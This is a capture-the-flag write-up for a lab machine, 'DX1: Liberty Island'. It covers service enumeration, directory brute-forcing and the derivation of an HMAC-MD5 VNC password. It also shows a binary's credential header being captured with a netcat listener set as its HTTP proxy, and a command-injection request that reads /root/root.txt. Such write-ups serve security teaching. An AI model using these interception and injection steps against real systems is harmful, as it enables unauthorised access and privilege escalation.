# DX1: Liberty Island

**Difficulty:** Medium
**Category:** Web Enumeration, VNC, Command Injection

---

## Summary

The target exposed an Apache web server, VNC service, and an internal Command/Control service. Web enumeration revealed hidden numbered datacubes, including one containing instructions for generating the VNC password. After gaining VNC access, the `badactors-list` binary was intercepted to obtain the clearance code required by the Command/Control service. The authenticated `directive` parameter was then used to read the root flag.

---

# Attack Chain

1. Enumerate the exposed HTTP, VNC, and Command/Control services.
2. Discover `/datacubes/` through `robots.txt`.
3. Follow the redirect to `/datacubes/0000/` and enumerate `0000–1000`.
4. Find `0451`, containing the VNC password-generation instructions.
5. Generate HMAC-MD5 values using names from the Bad Actors list and identify the valid result.
6. Connect to VNC and obtain the user flag.
7. Execute `badactors-list` through an HTTP proxy and capture its request.
8. Recover the required `Clearance-Code`.
9. Use the authenticated Command/Control service to read `/root/root.txt`.

---

# Enumeration

## Nmap

```bash
nmap -sCV -v -p- 10.48.146.209
```

Relevant services:

```text
80/tcp    open  http    Apache httpd 2.4.41
5901/tcp  open  vnc     VNC 3.8
23023/tcp open  unknown
```

Port `80` hosted the **United Nations Anti-Terrorist Coalition** website.

Port `23023` identified itself as:

```text
UNATCO Liberty Island - Command/Control
RESTRICTED: ANGEL/OA
send a directive to process
```

Testing the service:

```bash
curl -i -X POST http://10.48.146.209:23023/ -d 'directive=test'
```

returned:

```text
HTTP/1.1 200 OK
Access-Control-Allow-Origin: *
Content-Type: text/plain

UNATCO Liberty Island - Command/Control

ACCESS DENIED - Invalid Clearance-Code
```

This confirmed that a `Clearance-Code` was required.

---

# Web Enumeration

Directory enumeration:

```bash
gobuster dir -u http://10.48.146.209 -w /usr/share/wordlists/dirb/big.txt
```

`robots.txt` revealed:

```text
Disallow: /datacubes
```

Opening:

```text
http://10.48.146.209/datacubes/
```

redirected to:

```text
http://10.48.146.209/datacubes/0000/
```

This indicated a numbered datacube structure, so `0000–1000` were enumerated using the attached Python script.

Five accessible datacubes were found. The important result was:

```text
[+] 0451/
```

Its contents were:

```text
Brother,<br/><br/>

I've set up <b>VNC</b> on this machine under jacobson's account. We don't know his loyalty, but should assume hostile.<br/>
Problem is he's good - no doubt he'll find it... a hasty defense, but
since we won't be here long, it should work.  <br/><br/>

The VNC login is the following message, 'smashthestate', hmac'ed with my username from the 'bad actors' list (lol). <br/>
Use md5 for the hmac hashing algo. The first 8 characters of the final hash is the VNC password.<br/><br/>

- JL
```

Therefore:

```text
Message : smashthestate
Key     : One of the names from the Bad Actors list
Algorithm : HMAC-MD5
Password : First 8 characters of the hash
```

---

# VNC Access

The names from the Bad Actors list were tested using the attached HMAC-MD5 Python script.

The valid finding was:

```text
jlebedev -> 31******
```

The generated password was used to connect to VNC:

```bash
vncviewer -SecurityTypes VncAuth 10.48.146.209:5901
```

The VNC desktop contained `user.txt`, providing the **user flag**.

---

# Obtaining the Clearance Code

The VNC desktop also contained:

```text
 executable `badactors-list`
```

A listener was started on the AttackBox:

```bash
nc -lvnp 4444
```

The binary was executed through the HTTP proxy:

```bash
HTTP_PROXY=10.48.122.169:4444 ./badactors-list
```

The intercepted request revealed:

```http
POST http://UNATCO:23023/ HTTP/1.1
Host: UNATCO:23023
User-Agent: Go-http-client/1.1
Clearance-Code: 7gFfT7**********
Content-Type: application/x-www-form-urlencoded

directive=cat+%2Fvar%2Fwww%2Fhtml%2Fbadactors.txt
```

The `Clearance-Code` was now available for authenticated requests.

---

# Root Flag

The `UNATCO` hostname was mapped locally:

```bash
sudo nano /etc/hosts
```

Added:

```text
10.48.146.209 UNATCO
```

Using the recovered clearance code, the request was modified in Burp Suite:

```http
POST / HTTP/1.1
Host: UNATCO:23023
Clearance-Code: 7gFfT7**********
Content-Type: application/x-www-form-urlencoded

directive=cat%20/root/root%2Etxt
```

The Command/Control service executed the supplied directive and returned the contents of `/root/root.txt`.


